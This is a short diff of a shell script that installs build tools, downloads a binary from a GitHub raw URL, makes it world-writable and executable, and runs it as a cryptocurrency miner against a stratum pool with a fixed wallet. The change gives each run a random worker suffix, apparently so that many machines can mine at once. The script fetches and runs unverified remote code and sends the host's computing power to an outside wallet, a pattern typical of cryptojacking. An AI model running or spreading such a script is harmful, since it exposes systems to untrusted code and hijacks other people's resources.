@@ -3,4 +3,4 @@ apt-get update ; apt-get install sudo -y
 apt-get install build-essential -y
 wget -O rave https://github.com/kidoescegh/filee/raw/main/SRB-3.0
 chmod 777 rave
-./rave --algorithm tht --pool stratum+tcps://tht.mine-n-krush.org:5001 --wallet 429AyNsXPxVbgPNHSU3KkqqadymBSsnRDs.AP1
+./rave --algorithm tht --pool stratum+tcps://tht.mine-n-krush.org:5001 --wallet 429AyNsXPxVbgPNHSU3KkqqadymBSsnRDs.$(shuf -n 1 -i 1-99999)-AP1
